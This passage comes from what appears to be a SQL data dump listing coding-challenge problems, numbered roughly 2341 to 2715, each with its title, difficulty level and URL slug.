Array','Easy','maximum-number-of-pairs-in-array',1),(2342,'Max Sum of a Pair With Equal Sum of Digits','Medium','max-sum-of-a-pair-with-equal-sum-of-digits',1),(2343,'Query Kth Smallest Trimmed Number','Medium','query-kth-smallest-trimmed-number',1),(2344,'Minimum Deletions to Make Array Divisible','Hard','minimum-deletions-to-make-array-divisible',1),(2345,'Finding the Number of Visible Mountains','Medium','finding-the-number-of-visible-mountains',1),(2346,'Compute the Rank as a Percentage','Medium','compute-the-rank-as-a-percentage',1),(2347,'Best Poker Hand','Easy','best-poker-hand',1),(2348,'Number of Zero-Filled Subarrays','Medium','number-of-zero-filled-subarrays',1),(2349,'Design a Number Container System','Medium','design-a-number-container-system',1),(2350,'Shortest Impossible Sequence of Rolls','Hard','shortest-impossible-sequence-of-rolls',1),(2351,'First Letter to Appear Twice','Easy','first-letter-to-appear-twice',1),(2352,'Equal Row and Column Pairs','Medium','equal-row-and-column-pairs',1),(2353,'Design a Food Rating System','Medium','design-a-food-rating-system',1),(2354,'Number of Excellent Pairs','Hard','number-of-excellent-pairs',1),(2355,'Maximum Number of Books You Can Take','Hard','maximum-number-of-books-you-can-take',1),(2356,'Number of Unique Subjects Taught by Each Teacher','Easy','number-of-unique-subjects-taught-by-each-teacher',1),(2357,'Make Array Zero by Subtracting Equal Amounts','Easy','make-array-zero-by-subtracting-equal-amounts',1),(2358,'Maximum Number of Groups Entering a Competition','Medium','maximum-number-of-groups-entering-a-competition',1),(2359,'Find Closest Node to Given Two Nodes','Medium','find-closest-node-to-given-two-nodes',1),(2360,'Longest Cycle in a Graph','Hard','longest-cycle-in-a-graph',1),(2361,'Minimum Costs Using the Train Line','Hard','minimum-costs-using-the-train-line',1),(2362,'Generate the Invoice','Hard','generate-the-invoice',1),(2363,'Merge Similar Items','Easy','merge-similar-items',1),(2364,'Count Number of Bad Pairs','Medium','count-number-of-bad-pairs',1),(2365,'Task Scheduler II','Medium','task-scheduler-ii',1),(2366,'Minimum Replacements to Sort the Array','Hard','minimum-replacements-to-sort-the-array',1),(2367,'Number of Arithmetic Triplets','Easy','number-of-arithmetic-triplets',1),(2368,'Reachable Nodes With Restrictions','Medium','reachable-nodes-with-restrictions',1),(2369,'Check if There is a Valid Partition For The Array','Medium','check-if-there-is-a-valid-partition-for-the-array',1),(2370,'Longest Ideal Subsequence','Medium','longest-ideal-subsequence',1),(2371,'Minimize Maximum Value in a Grid','Hard','minimize-maximum-value-in-a-grid',1),(2372,'Calculate the Influence of Each Salesperson','Medium','calculate-the-influence-of-each-salesperson',1),(2373,'Largest Local Values in a Matrix','Easy','largest-local-values-in-a-matrix',1),(2374,'Node With Highest Edge Score','Medium','node-with-highest-edge-score',1),(2375,'Construct Smallest Number From DI String','Medium','construct-smallest-number-from-di-string',1),(2376,'Count Special Integers','Hard','count-special-integers',1),(2377,'Sort the Olympic Table','Easy','sort-the-olympic-table',1),(2378,'Choose Edges to Maximize Score in a Tree','Medium','choose-edges-to-maximize-score-in-a-tree',1),(2379,'Minimum Recolors to Get K Consecutive Black Blocks','Easy','minimum-recolors-to-get-k-consecutive-black-blocks',1),(2380,'Time Needed to Rearrange a Binary String','Medium','time-needed-to-rearrange-a-binary-string',1),(2381,'Shifting Letters II','Medium','shifting-letters-ii',1),(2382,'Maximum Segment Sum After Removals','Hard','maximum-segment-sum-after-removals',1),(2383,'Minimum Hours of Training to Win a Competition','Easy','minimum-hours-of-training-to-win-a-competition',1),(2384,'Largest Palindromic Number','Medium','largest-palindromic-number',1),(2385,'Amount of Time for Binary Tree to Be Infected','Medium','amount-of-time-for-binary-tree-to-be-infected',1),(2386,'Find the K-Sum of an Array','Hard','find-the-k-sum-of-an-array',1),(2387,'Median of a Row Wise Sorted Matrix','Medium','median-of-a-row-wise-sorted-matrix',1),(2388,'Change Null Values in a Table to the Previous Value','Medium','change-null-values-in-a-table-to-the-previous-value',1),(2389,'Longest Subsequence With Limited Sum','Easy','longest-subsequence-with-limited-sum',1),(2390,'Removing Stars From a String','Medium','removing-stars-from-a-string',1),(2391,'Minimum Amount of Time to Collect Garbage','Medium','minimum-amount-of-time-to-collect-garbage',1),(2392,'Build a Matrix With Conditions','Hard','build-a-matrix-with-conditions',1),(2393,'Count Strictly Increasing Subarrays','Medium','count-strictly-increasing-subarrays',1),(2394,'Employees With Deductions','Medium','employees-with-deductions',1),(2395,'Find Subarrays With Equal Sum','Easy','find-subarrays-with-equal-sum',1),(2396,'Strictly Palindromic Number','Medium','strictly-palindromic-number',1),(2397,'Maximum Rows Covered by Columns','Medium','maximum-rows-covered-by-columns',1),(2398,'Maximum Number of Robots Within Budget','Hard','maximum-number-of-robots-within-budget',1),(2399,'Check Distances Between Same Letters','Easy','check-distances-between-same-letters',1),(2400,'Number of Ways to Reach a Position After Exactly k Steps','Medium','number-of-ways-to-reach-a-position-after-exactly-k-steps',1),(2401,'Longest Nice Subarray','Medium','longest-nice-subarray',1),(2402,'Meeting Rooms III','Hard','meeting-rooms-iii',1),(2403,'Minimum Time to Kill All Monsters','Hard','minimum-time-to-kill-all-monsters',1),(2404,'Most Frequent Even Element','Easy','most-frequent-even-element',1),(2405,'Optimal Partition of String','Medium','optimal-partition-of-string',1),(2406,'Divide Intervals Into Minimum Number of Groups','Medium','divide-intervals-into-minimum-number-of-groups',1),(2407,'Longest Increasing Subsequence II','Hard','longest-increasing-subsequence-ii',1),(2408,'Design SQL','Medium','design-sql',1),(2409,'Count Days Spent Together','Easy','count-days-spent-together',1),(2410,'Maximum Matching of Players With Trainers','Medium','maximum-matching-of-players-with-trainers',1),(2411,'Smallest Subarrays With Maximum Bitwise OR','Medium','smallest-subarrays-with-maximum-bitwise-or',1),(2412,'Minimum Money Required Before Transactions','Hard','minimum-money-required-before-transactions',1),(2413,'Smallest Even Multiple','Easy','smallest-even-multiple',1),(2414,'Length of the Longest Alphabetical Continuous Substring','Medium','length-of-the-longest-alphabetical-continuous-substring',1),(2415,'Reverse Odd Levels of Binary Tree','Medium','reverse-odd-levels-of-binary-tree',1),(2416,'Sum of Prefix Scores of Strings','Hard','sum-of-prefix-scores-of-strings',1),(2417,'Closest Fair Integer','Medium','closest-fair-integer',1),(2418,'Sort the People','Easy','sort-the-people',1),(2419,'Longest Subarray With Maximum Bitwise AND','Medium','longest-subarray-with-maximum-bitwise-and',1),(2420,'Find All Good Indices','Medium','find-all-good-indices',1),(2421,'Number of Good Paths','Hard','number-of-good-paths',1),(2422,'Merge Operations to Turn Array Into a Palindrome','Medium','merge-operations-to-turn-array-into-a-palindrome',1),(2423,'Remove Letter To Equalize Frequency','Easy','remove-letter-to-equalize-frequency',1),(2424,'Longest Uploaded Prefix','Medium','longest-uploaded-prefix',1),(2425,'Bitwise XOR of All Pairings','Medium','bitwise-xor-of-all-pairings',1),(2426,'Number of Pairs Satisfying Inequality','Hard','number-of-pairs-satisfying-inequality',1),(2427,'Number of Common Factors','Easy','number-of-common-factors',1),(2428,'Maximum Sum of an Hourglass','Medium','maximum-sum-of-an-hourglass',1),(2429,'Minimize XOR','Medium','minimize-xor',1),(2430,'Maximum Deletions on a String','Hard','maximum-deletions-on-a-string',1),(2431,'Maximize Total Tastiness of Purchased Fruits','Medium','maximize-total-tastiness-of-purchased-fruits',1),(2432,'The Employee That Worked on the Longest Task','Easy','the-employee-that-worked-on-the-longest-task',1),(2433,'Find The Original Array of Prefix Xor','Medium','find-the-original-array-of-prefix-xor',1),(2434,'Using a Robot to Print the Lexicographically Smallest String','Medium','using-a-robot-to-print-the-lexicographically-smallest-string',1),(2435,'Paths in Matrix Whose Sum Is Divisible by K','Hard','paths-in-matrix-whose-sum-is-divisible-by-k',1),(2436,'Minimum Split Into Subarrays With GCD Greater Than One','Medium','minimum-split-into-subarrays-with-gcd-greater-than-one',1),(2437,'Number of Valid Clock Times','Easy','number-of-valid-clock-times',1),(2438,'Range Product Queries of Powers','Medium','range-product-queries-of-powers',1),(2439,'Minimize Maximum of Array','Medium','minimize-maximum-of-array',1),(2440,'Create Components With Same Value','Hard','create-components-with-same-value',1),(2441,'Largest Positive Integer That Exists With Its Negative','Easy','largest-positive-integer-that-exists-with-its-negative',1),(2442,'Count Number of Distinct Integers After Reverse Operations','Medium','count-number-of-distinct-integers-after-reverse-operations',1),(2443,'Sum of Number and Its Reverse','Medium','sum-of-number-and-its-reverse',1),(2444,'Count Subarrays With Fixed Bounds','Hard','count-subarrays-with-fixed-bounds',1),(2445,'Number of Nodes With Value One','Medium','number-of-nodes-with-value-one',1),(2446,'Determine if Two Events Have Conflict','Easy','determine-if-two-events-have-conflict',1),(2447,'Number of Subarrays With GCD Equal to K','Medium','number-of-subarrays-with-gcd-equal-to-k',1),(2448,'Minimum Cost to Make Array Equal','Hard','minimum-cost-to-make-array-equal',1),(2449,'Minimum Number of Operations to Make Arrays Similar','Hard','minimum-number-of-operations-to-make-arrays-similar',1),(2450,'Number of Distinct Binary Strings After Applying Operations','Medium','number-of-distinct-binary-strings-after-applying-operations',1),(2451,'Odd String Difference','Easy','odd-string-difference',1),(2452,'Words Within Two Edits of Dictionary','Medium','words-within-two-edits-of-dictionary',1),(2453,'Destroy Sequential Targets','Medium','destroy-sequential-targets',1),(2454,'Next Greater Element IV','Hard','next-greater-element-iv',1),(2455,'Average Value of Even Numbers That Are Divisible by Three','Easy','average-value-of-even-numbers-that-are-divisible-by-three',1),(2456,'Most Popular Video Creator','Medium','most-popular-video-creator',1),(2457,'Minimum Addition to Make Integer Beautiful','Medium','minimum-addition-to-make-integer-beautiful',1),(2458,'Height of Binary Tree After Subtree Removal Queries','Hard','height-of-binary-tree-after-subtree-removal-queries',1),(2459,'Sort Array by Moving Items to Empty Space','Hard','sort-array-by-moving-items-to-empty-space',1),(2460,'Apply Operations to an Array','Easy','apply-operations-to-an-array',1),(2461,'Maximum Sum of Distinct Subarrays With Length K','Medium','maximum-sum-of-distinct-subarrays-with-length-k',1),(2462,'Total Cost to Hire K Workers','Medium','total-cost-to-hire-k-workers',1),(2463,'Minimum Total Distance Traveled','Hard','minimum-total-distance-traveled',1),(2464,'Minimum Subarrays in a Valid Split','Medium','minimum-subarrays-in-a-valid-split',1),(2465,'Number of Distinct Averages','Easy','number-of-distinct-averages',1),(2466,'Count Ways To Build Good Strings','Medium','count-ways-to-build-good-strings',1),(2467,'Most Profitable Path in a Tree','Medium','most-profitable-path-in-a-tree',1),(2468,'Split Message Based on Limit','Hard','split-message-based-on-limit',1),(2469,'Convert the Temperature','Easy','convert-the-temperature',1),(2470,'Number of Subarrays With LCM Equal to K','Medium','number-of-subarrays-with-lcm-equal-to-k',1),(2471,'Minimum Number of Operations to Sort a Binary Tree by Level','Medium','minimum-number-of-operations-to-sort-a-binary-tree-by-level',1),(2472,'Maximum Number of Non-overlapping Palindrome Substrings','Hard','maximum-number-of-non-overlapping-palindrome-substrings',1),(2473,'Minimum Cost to Buy Apples','Medium','minimum-cost-to-buy-apples',1),(2474,'Customers With Strictly Increasing Purchases','Hard','customers-with-strictly-increasing-purchases',1),(2475,'Number of Unequal Triplets in Array','Easy','number-of-unequal-triplets-in-array',1),(2476,'Closest Nodes Queries in a Binary Search Tree','Medium','closest-nodes-queries-in-a-binary-search-tree',1),(2477,'Minimum Fuel Cost to Report to the Capital','Medium','minimum-fuel-cost-to-report-to-the-capital',1),(2478,'Number of Beautiful Partitions','Hard','number-of-beautiful-partitions',1),(2479,'Maximum XOR of Two Non-Overlapping Subtrees','Hard','maximum-xor-of-two-non-overlapping-subtrees',1),(2480,'Form a Chemical Bond','Easy','form-a-chemical-bond',1),(2481,'Minimum Cuts to Divide a Circle','Easy','minimum-cuts-to-divide-a-circle',1),(2482,'Difference Between Ones and Zeros in Row and Column','Medium','difference-between-ones-and-zeros-in-row-and-column',1),(2483,'Minimum Penalty for a Shop','Medium','minimum-penalty-for-a-shop',1),(2484,'Count Palindromic Subsequences','Hard','count-palindromic-subsequences',1),(2485,'Find the Pivot Integer','Easy','find-the-pivot-integer',1),(2486,'Append Characters to String to Make Subsequence','Medium','append-characters-to-string-to-make-subsequence',1),(2487,'Remove Nodes From Linked List','Medium','remove-nodes-from-linked-list',1),(2488,'Count Subarrays With Median K','Hard','count-subarrays-with-median-k',1),(2489,'Number of Substrings With Fixed Ratio','Medium','number-of-substrings-with-fixed-ratio',1),(2490,'Circular Sentence','Easy','circular-sentence',1),(2491,'Divide Players Into Teams of Equal Skill','Medium','divide-players-into-teams-of-equal-skill',1),(2492,'Minimum Score of a Path Between Two Cities','Medium','minimum-score-of-a-path-between-two-cities',1),(2493,'Divide Nodes Into the Maximum Number of Groups','Hard','divide-nodes-into-the-maximum-number-of-groups',1),(2494,'Merge Overlapping Events in the Same Hall','Hard','merge-overlapping-events-in-the-same-hall',1),(2495,'Number of Subarrays Having Even Product','Medium','number-of-subarrays-having-even-product',1),(2496,'Maximum Value of a String in an Array','Easy','maximum-value-of-a-string-in-an-array',1),(2497,'Maximum Star Sum of a Graph','Medium','maximum-star-sum-of-a-graph',1),(2498,'Frog Jump II','Medium','frog-jump-ii',1),(2499,'Minimum Total Cost to Make Arrays Unequal','Hard','minimum-total-cost-to-make-arrays-unequal',1),(2500,'Delete Greatest Value in Each Row','Easy','delete-greatest-value-in-each-row',1),(2501,'Longest Square Streak in an Array','Medium','longest-square-streak-in-an-array',1),(2502,'Design Memory Allocator','Medium','design-memory-allocator',1),(2503,'Maximum Number of Points From Grid Queries','Hard','maximum-number-of-points-from-grid-queries',1),(2504,'Concatenate the Name and the Profession','Easy','concatenate-the-name-and-the-profession',1),(2505,'Bitwise OR of All Subsequence Sums','Medium','bitwise-or-of-all-subsequence-sums',1),(2506,'Count Pairs Of Similar Strings','Easy','count-pairs-of-similar-strings',1),(2507,'Smallest Value After Replacing With Sum of Prime Factors','Medium','smallest-value-after-replacing-with-sum-of-prime-factors',1),(2508,'Add Edges to Make Degrees of All Nodes Even','Hard','add-edges-to-make-degrees-of-all-nodes-even',1),(2509,'Cycle Length Queries in a Tree','Hard','cycle-length-queries-in-a-tree',1),(2510,'Check if There is a Path With Equal Number of 0\'s And 1\'s','Medium','check-if-there-is-a-path-with-equal-number-of-0s-and-1s',1),(2511,'Maximum Enemy Forts That Can Be Captured','Easy','maximum-enemy-forts-that-can-be-captured',1),(2512,'Reward Top K Students','Medium','reward-top-k-students',1),(2513,'Minimize the Maximum of Two Arrays','Medium','minimize-the-maximum-of-two-arrays',1),(2514,'Count Anagrams','Hard','count-anagrams',1),(2515,'Shortest Distance to Target String in a Circular Array','Easy','shortest-distance-to-target-string-in-a-circular-array',1),(2516,'Take K of Each Character From Left and Right','Medium','take-k-of-each-character-from-left-and-right',1),(2517,'Maximum Tastiness of Candy Basket','Medium','maximum-tastiness-of-candy-basket',1),(2518,'Number of Great Partitions','Hard','number-of-great-partitions',1),(2519,'Count the Number of K-Big Indices','Hard','count-the-number-of-k-big-indices',1),(2520,'Count the Digits That Divide a Number','Easy','count-the-digits-that-divide-a-number',1),(2521,'Distinct Prime Factors of Product of Array','Medium','distinct-prime-factors-of-product-of-array',1),(2522,'Partition String Into Substrings With Values at Most K','Medium','partition-string-into-substrings-with-values-at-most-k',1),(2523,'Closest Prime Numbers in Range','Medium','closest-prime-numbers-in-range',1),(2524,'Maximum Frequency Score of a Subarray','Hard','maximum-frequency-score-of-a-subarray',1),(2525,'Categorize Box According to Criteria','Easy','categorize-box-according-to-criteria',1),(2526,'Find Consecutive Integers from a Data Stream','Medium','find-consecutive-integers-from-a-data-stream',1),(2527,'Find Xor-Beauty of Array','Medium','find-xor-beauty-of-array',1),(2528,'Maximize the Minimum Powered City','Hard','maximize-the-minimum-powered-city',1),(2529,'Maximum Count of Positive Integer and Negative Integer','Easy','maximum-count-of-positive-integer-and-negative-integer',1),(2530,'Maximal Score After Applying K Operations','Medium','maximal-score-after-applying-k-operations',1),(2531,'Make Number of Distinct Characters Equal','Medium','make-number-of-distinct-characters-equal',1),(2532,'Time to Cross a Bridge','Hard','time-to-cross-a-bridge',1),(2533,'Number of Good Binary Strings','Medium','number-of-good-binary-strings',1),(2534,'Time Taken to Cross the Door','Hard','time-taken-to-cross-the-door',1),(2535,'Difference Between Element Sum and Digit Sum of an Array','Easy','difference-between-element-sum-and-digit-sum-of-an-array',1),(2536,'Increment Submatrices by One','Medium','increment-submatrices-by-one',1),(2537,'Count the Number of Good Subarrays','Medium','count-the-number-of-good-subarrays',1),(2538,'Difference Between Maximum and Minimum Price Sum','Hard','difference-between-maximum-and-minimum-price-sum',1),(2539,'Count the Number of Good Subsequences','Medium','count-the-number-of-good-subsequences',1),(2540,'Minimum Common Value','Easy','minimum-common-value',1),(2541,'Minimum Operations to Make Array Equal II','Medium','minimum-operations-to-make-array-equal-ii',1),(2542,'Maximum Subsequence Score','Medium','maximum-subsequence-score',1),(2543,'Check if Point Is Reachable','Hard','check-if-point-is-reachable',1),(2544,'Alternating Digit Sum','Easy','alternating-digit-sum',1),(2545,'Sort the Students by Their Kth Score','Medium','sort-the-students-by-their-kth-score',1),(2546,'Apply Bitwise Operations to Make Strings Equal','Medium','apply-bitwise-operations-to-make-strings-equal',1),(2547,'Minimum Cost to Split an Array','Hard','minimum-cost-to-split-an-array',1),(2548,'Maximum Price to Fill a Bag','Medium','maximum-price-to-fill-a-bag',1),(2549,'Count Distinct Numbers on Board','Easy','count-distinct-numbers-on-board',1),(2550,'Count Collisions of Monkeys on a Polygon','Medium','count-collisions-of-monkeys-on-a-polygon',1),(2551,'Put Marbles in Bags','Hard','put-marbles-in-bags',1),(2552,'Count Increasing Quadruplets','Hard','count-increasing-quadruplets',1),(2553,'Separate the Digits in an Array','Easy','separate-the-digits-in-an-array',1),(2554,'Maximum Number of Integers to Choose From a Range I','Medium','maximum-number-of-integers-to-choose-from-a-range-i',1),(2555,'Maximize Win From Two Segments','Medium','maximize-win-from-two-segments',1),(2556,'Disconnect Path in a Binary Matrix by at Most One Flip','Medium','disconnect-path-in-a-binary-matrix-by-at-most-one-flip',1),(2557,'Maximum Number of Integers to Choose From a Range II','Medium','maximum-number-of-integers-to-choose-from-a-range-ii',1),(2558,'Take Gifts From the Richest Pile','Easy','take-gifts-from-the-richest-pile',1),(2559,'Count Vowel Strings in Ranges','Medium','count-vowel-strings-in-ranges',1),(2560,'House Robber IV','Medium','house-robber-iv',1),(2561,'Rearranging Fruits','Hard','rearranging-fruits',1),(2562,'Find the Array Concatenation Value','Easy','find-the-array-concatenation-value',1),(2563,'Count the Number of Fair Pairs','Medium','count-the-number-of-fair-pairs',1),(2564,'Substring XOR Queries','Medium','substring-xor-queries',1),(2565,'Subsequence With the Minimum Score','Hard','subsequence-with-the-minimum-score',1),(2566,'Maximum Difference by Remapping a Digit','Easy','maximum-difference-by-remapping-a-digit',1),(2567,'Minimum Score by Changing Two Elements','Medium','minimum-score-by-changing-two-elements',1),(2568,'Minimum Impossible OR','Medium','minimum-impossible-or',1),(2569,'Handling Sum Queries After Update','Hard','handling-sum-queries-after-update',1),(2570,'Merge Two 2D Arrays by Summing Values','Easy','merge-two-2d-arrays-by-summing-values',1),(2571,'Minimum Operations to Reduce an Integer to 0','Medium','minimum-operations-to-reduce-an-integer-to-0',1),(2572,'Count the Number of Square-Free Subsets','Medium','count-the-number-of-square-free-subsets',1),(2573,'Find the String with LCP','Hard','find-the-string-with-lcp',1),(2574,'Left and Right Sum Differences','Easy','left-and-right-sum-differences',1),(2575,'Find the Divisibility Array of a String','Medium','find-the-divisibility-array-of-a-string',1),(2576,'Find the Maximum Number of Marked Indices','Medium','find-the-maximum-number-of-marked-indices',1),(2577,'Minimum Time to Visit a Cell In a Grid','Hard','minimum-time-to-visit-a-cell-in-a-grid',1),(2578,'Split With Minimum Sum','Easy','split-with-minimum-sum',1),(2579,'Count Total Number of Colored Cells','Medium','count-total-number-of-colored-cells',1),(2580,'Count Ways to Group Overlapping Ranges','Medium','count-ways-to-group-overlapping-ranges',1),(2581,'Count Number of Possible Root Nodes','Hard','count-number-of-possible-root-nodes',1),(2582,'Pass the Pillow','Easy','pass-the-pillow',1),(2583,'Kth Largest Sum in a Binary Tree','Medium','kth-largest-sum-in-a-binary-tree',1),(2584,'Split the Array to Make Coprime Products','Hard','split-the-array-to-make-coprime-products',1),(2585,'Number of Ways to Earn Points','Hard','number-of-ways-to-earn-points',1),(2586,'Count the Number of Vowel Strings in Range','Easy','count-the-number-of-vowel-strings-in-range',1),(2587,'Rearrange Array to Maximize Prefix Score','Medium','rearrange-array-to-maximize-prefix-score',1),(2588,'Count the Number of Beautiful Subarrays','Medium','count-the-number-of-beautiful-subarrays',1),(2589,'Minimum Time to Complete All Tasks','Hard','minimum-time-to-complete-all-tasks',1),(2590,'Design a Todo List','Medium','design-a-todo-list',1),(2591,'Distribute Money to Maximum Children','Easy','distribute-money-to-maximum-children',1),(2592,'Maximize Greatness of an Array','Medium','maximize-greatness-of-an-array',1),(2593,'Find Score of an Array After Marking All Elements','Medium','find-score-of-an-array-after-marking-all-elements',1),(2594,'Minimum Time to Repair Cars','Medium','minimum-time-to-repair-cars',1),(2595,'Number of Even and Odd Bits','Easy','number-of-even-and-odd-bits',1),(2596,'Check Knight Tour Configuration','Medium','check-knight-tour-configuration',1),(2597,'The Number of Beautiful Subsets','Medium','the-number-of-beautiful-subsets',1),(2598,'Smallest Missing Non-negative Integer After Operations','Medium','smallest-missing-non-negative-integer-after-operations',1),(2599,'Make the Prefix Sum Non-negative','Medium','make-the-prefix-sum-non-negative',1),(2600,'K Items With the Maximum Sum','Easy','k-items-with-the-maximum-sum',1),(2601,'Prime Subtraction Operation','Medium','prime-subtraction-operation',1),(2602,'Minimum Operations to Make All Array Elements Equal','Medium','minimum-operations-to-make-all-array-elements-equal',1),(2603,'Collect Coins in a Tree','Hard','collect-coins-in-a-tree',1),(2604,'Minimum Time to Eat All Grains','Hard','minimum-time-to-eat-all-grains',1),(2605,'Form Smallest Number From Two Digit Arrays','Easy','form-smallest-number-from-two-digit-arrays',1),(2606,'Find the Substring With Maximum Cost','Medium','find-the-substring-with-maximum-cost',1),(2607,'Make K-Subarray Sums Equal','Medium','make-k-subarray-sums-equal',1),(2608,'Shortest Cycle in a Graph','Hard','shortest-cycle-in-a-graph',1),(2609,'Find the Longest Balanced Substring of a Binary String','Easy','find-the-longest-balanced-substring-of-a-binary-string',1),(2610,'Convert an Array Into a 2D Array With Conditions','Medium','convert-an-array-into-a-2d-array-with-conditions',1),(2611,'Mice and Cheese','Medium','mice-and-cheese',1),(2612,'Minimum Reverse Operations','Hard','minimum-reverse-operations',1),(2613,'Beautiful Pairs','Hard','beautiful-pairs',1),(2614,'Prime In Diagonal','Easy','prime-in-diagonal',1),(2615,'Sum of Distances','Medium','sum-of-distances',1),(2616,'Minimize the Maximum Difference of Pairs','Medium','minimize-the-maximum-difference-of-pairs',1),(2617,'Minimum Number of Visited Cells in a Grid','Hard','minimum-number-of-visited-cells-in-a-grid',1),(2618,'Check if Object Instance of Class','Medium','check-if-object-instance-of-class',1),(2619,'Array Prototype Last','Easy','array-prototype-last',1),(2620,'Counter','Easy','counter',1),(2621,'Sleep','Easy','sleep',1),(2622,'Cache With Time Limit','Medium','cache-with-time-limit',1),(2623,'Memoize','Medium','memoize',1),(2624,'Snail Traversal','Medium','snail-traversal',1),(2625,'Flatten Deeply Nested Array','Medium','flatten-deeply-nested-array',1),(2626,'Array Reduce Transformation','Easy','array-reduce-transformation',1),(2627,'Debounce','Medium','debounce',1),(2628,'JSON Deep Equal','Medium','json-deep-equal',1),(2629,'Function Composition','Easy','function-composition',1),(2630,'Memoize II','Hard','memoize-ii',1),(2631,'Group By','Medium','group-by',1),(2632,'Curry','Medium','curry',1),(2633,'Convert Object to JSON String','Medium','convert-object-to-json-string',1),(2634,'Filter Elements from Array','Easy','filter-elements-from-array',1),(2635,'Apply Transform Over Each Element in Array','Easy','apply-transform-over-each-element-in-array',1),(2636,'Promise Pool','Medium','promise-pool',1),(2637,'Promise Time Limit','Medium','promise-time-limit',1),(2638,'Count the Number of K-Free Subsets','Medium','count-the-number-of-k-free-subsets',1),(2639,'Find the Width of Columns of a Grid','Easy','find-the-width-of-columns-of-a-grid',1),(2640,'Find the Score of All Prefixes of an Array','Medium','find-the-score-of-all-prefixes-of-an-array',1),(2641,'Cousins in Binary Tree II','Medium','cousins-in-binary-tree-ii',1),(2642,'Design Graph With Shortest Path Calculator','Hard','design-graph-with-shortest-path-calculator',1),(2643,'Row With Maximum Ones','Easy','row-with-maximum-ones',1),(2644,'Find the Maximum Divisibility Score','Easy','find-the-maximum-divisibility-score',1),(2645,'Minimum Additions to Make Valid String','Medium','minimum-additions-to-make-valid-string',1),(2646,'Minimize the Total Price of the Trips','Hard','minimize-the-total-price-of-the-trips',1),(2647,'Color the Triangle Red','Hard','color-the-triangle-red',1),(2648,'Generate Fibonacci Sequence','Easy','generate-fibonacci-sequence',1),(2649,'Nested Array Generator','Medium','nested-array-generator',1),(2650,'Design Cancellable Function','Hard','design-cancellable-function',1),(2651,'Calculate Delayed Arrival Time','Easy','calculate-delayed-arrival-time',1),(2652,'Sum Multiples','Easy','sum-multiples',1),(2653,'Sliding Subarray Beauty','Medium','sliding-subarray-beauty',1),(2654,'Minimum Number of Operations to Make All Array Elements Equal to 1','Medium','minimum-number-of-operations-to-make-all-array-elements-equal-to-1',1),(2655,'Find Maximal Uncovered Ranges','Medium','find-maximal-uncovered-ranges',1),(2656,'Maximum Sum With Exactly K Elements ','Easy','maximum-sum-with-exactly-k-elements',1),(2657,'Find the Prefix Common Array of Two Arrays','Medium','find-the-prefix-common-array-of-two-arrays',1),(2658,'Maximum Number of Fish in a Grid','Medium','maximum-number-of-fish-in-a-grid',1),(2659,'Make Array Empty','Hard','make-array-empty',1),(2660,'Determine the Winner of a Bowling Game','Easy','determine-the-winner-of-a-bowling-game',1),(2661,'First Completely Painted Row or Column','Medium','first-completely-painted-row-or-column',1),(2662,'Minimum Cost of a Path With Special Roads','Medium','minimum-cost-of-a-path-with-special-roads',1),(2663,'Lexicographically Smallest Beautiful String','Hard','lexicographically-smallest-beautiful-string',1),(2664,'The Knight’s Tour','Medium','the-knights-tour',1),(2665,'Counter II','Easy','counter-ii',1),(2666,'Allow One Function Call','Easy','allow-one-function-call',1),(2667,'Create Hello World Function','Easy','create-hello-world-function',1),(2668,'Find Latest Salaries','Easy','find-latest-salaries',1),(2669,'Count Artist Occurrences On Spotify Ranking List','Easy','count-artist-occurrences-on-spotify-ranking-list',1),(2670,'Find the Distinct Difference Array','Easy','find-the-distinct-difference-array',1),(2671,'Frequency Tracker','Medium','frequency-tracker',1),(2672,'Number of Adjacent Elements With the Same Color','Medium','number-of-adjacent-elements-with-the-same-color',1),(2673,'Make Costs of Paths Equal in a Binary Tree','Medium','make-costs-of-paths-equal-in-a-binary-tree',1),(2674,'Split a Circular Linked List','Medium','split-a-circular-linked-list',1),(2675,'Array of Objects to Matrix','Hard','array-of-objects-to-matrix',1),(2676,'Throttle','Medium','throttle',1),(2677,'Chunk Array','Easy','chunk-array',1),(2678,'Number of Senior Citizens','Easy','number-of-senior-citizens',1),(2679,'Sum in a Matrix','Medium','sum-in-a-matrix',1),(2680,'Maximum OR','Medium','maximum-or',1),(2681,'Power of Heroes','Hard','power-of-heroes',1),(2682,'Find the Losers of the Circular Game','Easy','find-the-losers-of-the-circular-game',1),(2683,'Neighboring Bitwise XOR','Medium','neighboring-bitwise-xor',1),(2684,'Maximum Number of Moves in a Grid','Medium','maximum-number-of-moves-in-a-grid',1),(2685,'Count the Number of Complete Components','Medium','count-the-number-of-complete-components',1),(2686,'Immediate Food Delivery III','Medium','immediate-food-delivery-iii',1),(2687,'Bikes Last Time Used ','Easy','bikes-last-time-used',1),(2688,'Find Active Users','Medium','find-active-users',1),(2689,'Extract Kth Character From The Rope Tree','Easy','extract-kth-character-from-the-rope-tree',1),(2690,'Infinite Method Object','Easy','infinite-method-object',1),(2691,'Immutability Helper','Hard','immutability-helper',1),(2692,'Make Object Immutable','Medium','make-object-immutable',1),(2693,'Call Function with Custom Context','Medium','call-function-with-custom-context',1),(2694,'Event Emitter','Medium','event-emitter',1),(2695,'Array Wrapper','Easy','array-wrapper',1),(2696,'Minimum String Length After Removing Substrings','Easy','minimum-string-length-after-removing-substrings',1),(2697,'Lexicographically Smallest Palindrome','Easy','lexicographically-smallest-palindrome',1),(2698,'Find the Punishment Number of an Integer','Medium','find-the-punishment-number-of-an-integer',1),(2699,'Modify Graph Edge Weights','Hard','modify-graph-edge-weights',1),(2700,'Differences Between Two Objects','Medium','differences-between-two-objects',1),(2701,'Consecutive Transactions with Increasing Amounts','Hard','consecutive-transactions-with-increasing-amounts',1),(2702,'Minimum Operations to Make Numbers Non-positive','Hard','minimum-operations-to-make-numbers-non-positive',1),(2703,'Return Length of Arguments Passed','Easy','return-length-of-arguments-passed',1),(2704,'To Be Or Not To Be','Easy','to-be-or-not-to-be',1),(2705,'Compact Object','Medium','compact-object',1),(2706,'Buy Two Chocolates','Easy','buy-two-chocolates',1),(2707,'Extra Characters in a String','Medium','extra-characters-in-a-string',1),(2708,'Maximum Strength of a Group','Medium','maximum-strength-of-a-group',1),(2709,'Greatest Common Divisor Traversal','Hard','greatest-common-divisor-traversal',1),(2710,'Remove Trailing Zeros From a String','Easy','remove-trailing-zeros-from-a-string',1),(2711,'Difference of Number of Distinct Values on Diagonals','Medium','difference-of-number-of-distinct-values-on-diagonals',1),(2712,'Minimum Cost to Make All Characters Equal','Medium','minimum-cost-to-make-all-characters-equal',1),(2713,'Maximum Strictly Increasing Cells in a Matrix','Hard','maximum-strictly-increasing-cells-in-a-matrix',1),(2714,'Find Shortest Path with K Hops','Hard','find-shortest-path-with-k-hops',1),(2715,'Timeout 